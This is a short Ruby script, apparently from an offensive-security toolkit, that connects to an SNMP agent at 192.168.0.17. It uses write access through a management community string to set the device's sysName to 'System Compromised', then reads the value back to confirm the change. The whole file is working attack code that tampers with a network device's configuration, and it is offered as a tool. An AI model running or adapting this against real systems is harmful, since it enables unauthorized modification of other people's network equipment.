#!/usr/bin/ruby
# KING SABRI extended Surfs Up
#May get private/management SNMP string, can be used to make system changes

require 'snmp'
include SNMP

#Connect to SNMP server
manager = SNMP::Manager.new(:host => '192.168.0.17')
#Config our request to OID
varbind = VarBind.new("1.3.6.1.2.1.1.5.0", OctetString.new("System Compromised"))
#Send request with varbind settings
manager.set(varbind)
#Check changes
manager.get("sysName.0").each_varbind.map {|vb| vb.value.to_s}
manager.close
